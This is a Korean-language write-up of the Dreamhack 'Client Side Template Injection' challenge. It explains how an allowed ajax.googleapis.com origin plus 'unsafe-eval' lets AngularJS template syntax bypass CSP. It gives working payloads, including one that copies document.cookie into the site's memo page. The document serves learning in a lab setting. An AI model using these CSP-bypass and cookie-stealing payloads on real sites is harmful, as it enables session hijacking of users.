# Challenge: dreamhack - Client Side Template Injection

## 문제 설명 & 접근
https://dreamhack.io/wargame/challenges/437/



## 추가학습
### CSP에서의 'unsafe-eval'
* JS에서 Function 생성자인 new Function()이나 Function()는 동적 코드 실행이므로 CSP에서 'unsafe-eval'이 없으면 차단된다.
* 즉 eval()을 직접 호출하지 않아도 Function() 호출은 eval 계열 API로 분류되어 'unsafe-eval' 허용이 필요하다.
* 아래 페이로드에서 Angular 템플릿 엔진이 constructor.constructor("alert(1)")()를 평가할 때 CSP에 'unsafe-eval'이 없으면 브라우저 보안 정책에 의해 막힌다.


## 문제 풀이
Step 1
* app.py에서 CSP부분 부터 확인해보자.
    ```python
    @app.after_request
    def add_header(response):
        global nonce
        response.headers['Content-Security-Policy'] = f"default-src 'self'; img-src https://dreamhack.io; style-src 'self' 'unsafe-inline'; script-src 'nonce-{nonce}' 'unsafe-eval' https://ajax.googleapis.com; object-src 'none'"
        nonce = os.urandom(16).hex()
        return response
    ```
    * script는 nonce 속성이 필요하고 허용된 출처는 https://ajax.googleapis.com이다. 그런데 unsafe-eval이 설정되어 있다. 즉, 스크립트 내에서 eval을 사용할 수 있다는 것이다.
    * https://ajax.googleapis.com 이 출처는 뭘까? 해당 출처는 Google hosted libraries  사이트이다. 만약 해당 출처 내에 JSONP 엔드포인트가 있다면 ```<script src="...">```로 불러와서 임의 함수를 호출할 수 있었을 것이다. 다만 이 출처에서는 주로 정적 JS 라이브러리만 서빙해서 JSONP 취약점을 쓰기에는 쉽지 않다.
    * JS 실행이 가능한 대표 프레임워크인 AngularJS를 이용하자. 현재 페이지에 AngularJS가 없더라도 CSP가 https://ajax.googleapis.com을 허용하 https://ajax.googleapis.com/ajax/libs/angularjs/1.8.3/angular.min.js를 script src에 둘 수 있다. 이를 통해 페이지에 AngularJS를 로드하고 Angular 템플릿 구문 {{...}}으로 CSTI를 하자.

Step 2 페이로드 작성
* AngularJS를 외부에서 불러오자. AngularJS가 로드된 상태에서 ng-app가 붙은 HTML은 Angular 템플릿 엔진에 의해 처리된다. constructor.constructor("alert(1)")은 실제로 Function("alert(1)")() 호출과 동일하다. 
    ```javascript
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.3/angular.min.js"></script><html ng-app>{{ constructor.constructor("alert(1)")() }}</html>
    ```
* 이전 XSS 등의 문제를 응용해 /memo에 document.cookie를 쓰게끔 코드를 작성하면 플래그를 얻을 수 있다.
    ```javascript
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.3/angular.min.js"></script><html ng-app>{{ constructor.constructor("location='memo?memo='+document.cookie")() }}</html>
    ```


## 결과
